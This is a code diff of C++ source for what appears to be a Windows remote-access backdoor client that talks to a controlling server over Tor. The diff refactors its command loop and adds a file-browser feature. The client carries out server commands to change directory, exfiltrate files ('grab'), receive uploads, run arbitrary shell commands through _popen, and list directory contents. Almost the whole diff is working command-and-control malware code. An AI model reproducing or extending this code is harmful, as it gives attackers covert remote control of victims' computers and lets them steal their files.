@@ -2,14 +2,14 @@
 
 #include "TorPlusPlus/torplusplus.hpp"
 
-#include <string>
 #include <Windows.h>
 #include <lmcons.h>
+#include <string>
 #include <filesystem>
 #include <vector>
-#include <iterator>
 #include <fstream>
 
+// Using raw sockets (not the torSock) just for getting the public IP from amazonaws
 #pragma comment(lib, "Ws2_32.lib")
 #include <WinSock2.h>
 
@@ -146,44 +146,67 @@ public:
         This is essentially the "main()" for the server.
         Only runs if this->connected is true.
     */
-    void cmdProcessLoop() {
-        if (!this->connected) { // Return immediately if not connected to the server
-            return;
+    bool cmdProcess() {
+        if (!this->connected) { // Return false immediately if not connected to the server
+            return false;
         }
-        while (1) {
-            char cmdBuff[1024] = { 0 }; // !! hard limits on command length arent epic
-            int bytesReceived = this->torSock.proxyRecv(cmdBuff, 1024);
-            if (bytesReceived <= 0) { // If receiving fails, assume the connection was lost and exit the loop
-                return;
-            }
-            std::string cmd = cmdBuff; // Convert for easier handling
-            if (cmd == "ping;") {
-                torSock.proxySendStr("ping;pong;");
-            }
-            else if (cmd.starts_with("cd;")) { // Change Directory
-                this->cd(cmd.substr(3, cmd.size() - 4));
-            }
-            else if (cmd.starts_with("grab;")) { // Uploads a file to the server
-                this->grab(cmd.substr(5, cmd.size() - 6));
-            }
-            else if (cmd.starts_with("upload;")) {
-                this->upload(cmdBuff, bytesReceived); // Using raw buffer, because null bytes are a thing.
-            }
-            else if (cmd.starts_with("exec;")) { // Executes a command via _popen()
-                this->exec(cmd.substr(5, cmd.size() - 6));
-            }
-            else {
-                // If the command is unknown to the client, return an error message to the server
-                std::string failResponse = "Received invalid command: " + cmd;
-                torSock.proxySendStr(failResponse);
-            }
+        char cmdBuff[1024] = { 0 }; // !! hard limits on command length arent epic
+        int bytesReceived = this->torSock.proxyRecv(cmdBuff, 1024);
+        if (bytesReceived <= 0) { // If receiving fails, assume the connection was lost
+            return false;
         }
+        std::string cmd = cmdBuff; // Convert for easier handling
+        if (cmd == "ping;") {
+            this->torSock.proxySendStr("ping;pong;");
+        }
+        else if (cmd.starts_with("cd;")) { // Change Directory
+            this->cd(cmd.substr(3, cmd.size() - 4));
+        }
+        else if (cmd.starts_with("grab;")) { // Uploads a file to the server
+            this->grab(cmd.substr(5, cmd.size() - 6));
+        }
+        else if (cmd.starts_with("upload;")) {
+            this->upload(cmdBuff, bytesReceived); // Using raw buffer, because null bytes are a thing.
+        }
+        else if (cmd.starts_with("exec;")) { // Executes a command via _popen()
+            this->exec(cmd.substr(5, cmd.size() - 6));
+        }
+        else if (cmd.starts_with("filebrowser;")) {
+            this->fileBrowser(cmd.substr(12, cmd.size() - 12));
+        }
+        else {
+            // If the command is unknown to the client, return an error message to the server
+            this->torSock.proxySendStr(std::string("Received invalid command: ") + cmd);
+        }
+        return true;
     }
 
     /*
-        ================ All the functions below this line are called by cmdProcessLoop() ================
+        ================ All the functions below this line are called by cmdProcess() ================
     */
 
+    /*
+        Handles all the requests made by the file browser on the server
+        These are just commands to get the current dir, and a list of everything in it in a nice format that it can parse
+    */
+    void fileBrowser(std::string cmd){
+        if (cmd.starts_with("gwd;")) {
+            std::string cwd = std::filesystem::current_path().string();
+            this->torSock.proxySendStr("filebrowser;gwd;" + cwd + ";");
+        }
+        else if (cmd.starts_with("ls;")) {
+            std::string response = "filebrowser;ls;";
+            for (const auto& f : std::filesystem::directory_iterator(".")) {
+                response.push_back(std::filesystem::is_directory(f) ? '1' : '0');
+                response += f.path().string();
+                response += ";";
+            }
+            this->torSock.proxySendStr(response);
+        }
+        else {
+            this->torSock.proxySendStr(std::string("Received invalid command; ") + cmd);
+        }
+    }
 
     /*
         Changes the current working directory of this executable to the one specified in the command
@@ -232,7 +255,7 @@ public:
         // Read the binary file data from the server
         std::vector<char> fileData;
         fileData.reserve(fileSize); // Reserve enough space for the whole file in the std::vector
-        unsigned bytesReceivedTotal = bytesReceivedInitial - headerSize; // Store the number of bytes of data received so far (in the first 1024 bytes that was read by cmdProcessLoop())
+        unsigned bytesReceivedTotal = bytesReceivedInitial - headerSize; // Store the number of bytes of data received so far (in the first 1024 bytes that was read by cmdProcess())
         printf("Received upload for %d bytes of data, filename: %s\n", fileSize, fileName.c_str());
         fileData.insert(fileData.end(), b + headerSize, b + bytesReceivedInitial); // Insert the first chunk of bytes into the fileData vector
         while (bytesReceivedTotal < fileSize) { // While we havent received the entire file, keep reading from the socket and pushing data back onto fileData
